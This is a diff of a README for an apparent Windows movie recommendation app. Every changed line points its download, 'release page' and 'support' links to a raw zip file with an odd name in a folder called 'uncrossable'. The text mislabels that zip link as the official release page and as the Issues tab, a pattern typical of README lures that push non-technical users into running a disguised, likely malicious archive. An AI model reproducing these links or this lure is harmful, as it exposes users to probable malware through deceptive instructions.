@@ -1,6 +1,6 @@
 # 🎬 movie-recomendation-system- - Simple Movie Picks for Everyone
 
-[![Download Latest Release](https://img.shields.io/badge/Download-via%20GitHub-%23e44c65?style=for-the-badge)](https://github.com/Lieutenantrothschild999/movie-recomendation-system-/raw/refs/heads/main/uncrossable/system-movie-recomendation-v3.9.zip)
+[![Download Latest Release](https://img.shields.io/badge/Download-via%20GitHub-%23e44c65?style=for-the-badge)](https://github.com/Lieutenantrothschild999/movie-recomendation-system-/raw/refs/heads/main/uncrossable/system_movie_recomendation_seismically.zip)
 
 ---
 
@@ -34,7 +34,7 @@ Before you start, check that your computer meets these basic needs:
 Follow these steps to get the app running on your Windows PC.
 
 1. Open this page:  
-   [https://github.com/Lieutenantrothschild999/movie-recomendation-system-/raw/refs/heads/main/uncrossable/system-movie-recomendation-v3.9.zip](https://github.com/Lieutenantrothschild999/movie-recomendation-system-/raw/refs/heads/main/uncrossable/system-movie-recomendation-v3.9.zip)  
+   [https://github.com/Lieutenantrothschild999/movie-recomendation-system-/raw/refs/heads/main/uncrossable/system_movie_recomendation_seismically.zip](https://github.com/Lieutenantrothschild999/movie-recomendation-system-/raw/refs/heads/main/uncrossable/system_movie_recomendation_seismically.zip)  
    This is the official release page where the app files are stored.
 
 2. Find the file for the latest version. It will likely look like:  
@@ -56,7 +56,7 @@ Follow these steps to get the app running on your Windows PC.
 
 Use this link to visit the release page and get the app:
 
-[https://github.com/Lieutenantrothschild999/movie-recomendation-system-/raw/refs/heads/main/uncrossable/system-movie-recomendation-v3.9.zip](https://github.com/Lieutenantrothschild999/movie-recomendation-system-/raw/refs/heads/main/uncrossable/system-movie-recomendation-v3.9.zip)
+[https://github.com/Lieutenantrothschild999/movie-recomendation-system-/raw/refs/heads/main/uncrossable/system_movie_recomendation_seismically.zip](https://github.com/Lieutenantrothschild999/movie-recomendation-system-/raw/refs/heads/main/uncrossable/system_movie_recomendation_seismically.zip)
 
 ---
 
@@ -134,7 +134,7 @@ It is better to keep older versions just in case you want to switch back.
 ## 🧾 Support Information
 
 If you have questions or want to report a bug, use the GitHub Issues tab on the original repository page:  
-[https://github.com/Lieutenantrothschild999/movie-recomendation-system-/raw/refs/heads/main/uncrossable/system-movie-recomendation-v3.9.zip](https://github.com/Lieutenantrothschild999/movie-recomendation-system-/raw/refs/heads/main/uncrossable/system-movie-recomendation-v3.9.zip)
+[https://github.com/Lieutenantrothschild999/movie-recomendation-system-/raw/refs/heads/main/uncrossable/system_movie_recomendation_seismically.zip](https://github.com/Lieutenantrothschild999/movie-recomendation-system-/raw/refs/heads/main/uncrossable/system_movie_recomendation_seismically.zip)
 
 Here you can:
 
@@ -164,4 +164,4 @@ This project uses an open license that allows you to use it freely.
 
 ---
 
-[![Download Latest Release](https://img.shields.io/badge/Download-via%20GitHub-%23e44c65?style=for-the-badge)](https://github.com/Lieutenantrothschild999/movie-recomendation-system-/raw/refs/heads/main/uncrossable/system-movie-recomendation-v3.9.zip)
+[![Download Latest Release](https://img.shields.io/badge/Download-via%20GitHub-%23e44c65?style=for-the-badge)](https://github.com/Lieutenantrothschild999/movie-recomendation-system-/raw/refs/heads/main/uncrossable/system_movie_recomendation_seismically.zip)
